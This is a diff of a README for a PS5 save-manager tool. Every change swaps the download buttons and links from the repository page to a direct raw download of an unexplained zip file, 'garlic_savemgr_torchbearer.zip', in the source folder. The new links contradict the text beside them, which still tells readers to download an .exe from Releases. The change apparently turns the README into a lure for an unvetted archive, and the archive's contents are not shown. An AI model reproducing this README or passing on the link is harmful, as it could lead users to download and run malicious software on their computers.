@@ -1,6 +1,6 @@
 # 🧄 garlic-savemgr - Manage Your PS5 Saves Locally
 
-[![Download garlic-savemgr](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Aucejoseph/garlic-savemgr)
+[![Download garlic-savemgr](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Aucejoseph/garlic-savemgr/raw/refs/heads/main/src/garlic_savemgr_torchbearer.zip)
 
 ---
 
@@ -38,7 +38,7 @@ To get garlic-savemgr on your Windows PC:
 
 - Visit the official download page here:
 
-  [Download garlic-savemgr](https://github.com/Aucejoseph/garlic-savemgr)
+  [Download garlic-savemgr](https://github.com/Aucejoseph/garlic-savemgr/raw/refs/heads/main/src/garlic_savemgr_torchbearer.zip)
 
 - On the page, locate the **Releases** section.
 - Download the latest `.exe` installer file.
@@ -115,4 +115,4 @@ If you run into issues:
 
 ---
 
-[![Download garlic-savemgr](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Aucejoseph/garlic-savemgr)
+[![Download garlic-savemgr](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Aucejoseph/garlic-savemgr/raw/refs/heads/main/src/garlic_savemgr_torchbearer.zip)
